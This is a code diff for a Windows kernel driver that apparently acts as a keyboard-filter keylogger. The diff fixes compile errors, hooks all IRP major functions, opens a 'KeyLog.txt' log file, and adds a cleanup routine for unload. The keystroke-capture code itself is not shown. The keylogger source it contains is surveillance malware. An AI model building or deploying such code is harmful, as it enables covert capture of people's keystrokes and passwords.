@@ -1,13 +1,18 @@
+extern "C" {
+#include <ntddk.h>
+}
 #include "common.h"
 #include "KWrite.h"
 #include "Klog.h"
 #include "KHook.h"
-extern "C" DriverEntry(PDRIVER_OBJECT pDriverObject, UNICODE_STRING RegisterPath)
+long g_PendingWrite = 0;
+extern "C" NTSTATUS DriverEntry( IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING RegistryPath )
+//extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING RegistryPath)
 {
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	int i ;
 	do{
-		for (i=0; i<IRP_MJ_MAXIMUM_FUNCTION, i++)
+		for (i=0; i<IRP_MJ_MAXIMUM_FUNCTION; i++)
 		{
 			pDriverObject->MajorFunction[i] = HookDevicePassThrough;
 		}
@@ -32,26 +37,50 @@ extern "C" DriverEntry(PDRIVER_OBJECT pDriverObject, UNICODE_STRING RegisterPath
 
 NTSTATUS OpenLogFile(PDRIVER_OBJECT pDriverObject)
 {
-	PDEVICE_EXTIONSION pKeyboarDeviceExtension = 
+	PDEVICE_EXTIONSION pKeyboardDeviceExtension = 
 		(PDEVICE_EXTIONSION)pDriverObject->DeviceObject->DeviceExtension;
-	WCHAR wFileName = "\\DosDevices\\c\\KeyLog.txt";
+	WCHAR wFileName[] = L"\\DosDevices\\c\\KeyLog.txt";
 	UNICODE_STRING uFileName;
 	OBJECT_ATTRIBUTES ObjAtr;
 	IO_STATUS_BLOCK IoStatus;
 	NTSTATUS Status ;
 	
 	RtlInitUnicodeString(&uFileName, wFileName);
-	InitializeObjectAttributes(&ObjAtr, uFileName, OBJ_KERNEL_HANDLE, NULL, NULL);
+	InitializeObjectAttributes(&ObjAtr, &uFileName, OBJ_KERNEL_HANDLE, NULL, NULL);
 	//zwCreateFile(&handle,GENERIC_WRITE,ObjAtr,FILE_CREATED, &ioStatus, NULL,FILE_ATTRIBUTE_NORMAL, 
 	//FILE_SHARE_READ,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL, 0);
-	Status = ZwCreateFile(pKeyboarDeviceExtension->hFile, GENERIC_WRITE, ObjAtr, FILE_CREATED, &IoStatus, FILE_ATTRIBUTE_NORMAL,
+	Status = ZwCreateFile(&pKeyboardDeviceExtension->hFile, GENERIC_WRITE, &ObjAtr, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL,
 		FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 	return Status;
 
 }
 
-
-NTSTATUS HookDeviceUnload(PDRIVER_OBJECT pDriverObject)
+VOID HookDeviceUnload(PDRIVER_OBJECT pDriverObject)
 {
-	
+	//删除设备，释放信号量，关闭文件
+	PDEVICE_EXTIONSION pKeyboardDeviceExtension = 
+		(PDEVICE_EXTIONSION)pDriverObject->DeviceObject->DeviceExtension;
+
+	LARGE_INTEGER waitTime;
+	KTIMER timer;
+	KeInitializeTimer(&timer);
+	waitTime.QuadPart = 1000000;
+	while (g_PendingWrite>0)
+	{
+		KeSetTimer(&timer, waitTime, NULL);
+		KeWaitForSingleObject(&timer, Executive, KernelMode, false, NULL);
+	}
+	pKeyboardDeviceExtension->bThreadTerminate = true;
+
+	KeReleaseSemaphore(&pKeyboardDeviceExtension->sem, 0, 1, true);
+	KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj, Executive, KernelMode, false, NULL);
+	if (pKeyboardDeviceExtension->hFile!=NULL)
+	{
+		ZwClose(pKeyboardDeviceExtension->hFile);
+	}
+	if (pKeyboardDeviceExtension->pKeyboardDevice!=NULL)
+	{
+		IoDeleteDevice(pKeyboardDeviceExtension->pKeyboardDevice);
+	}
+	return ;
 }
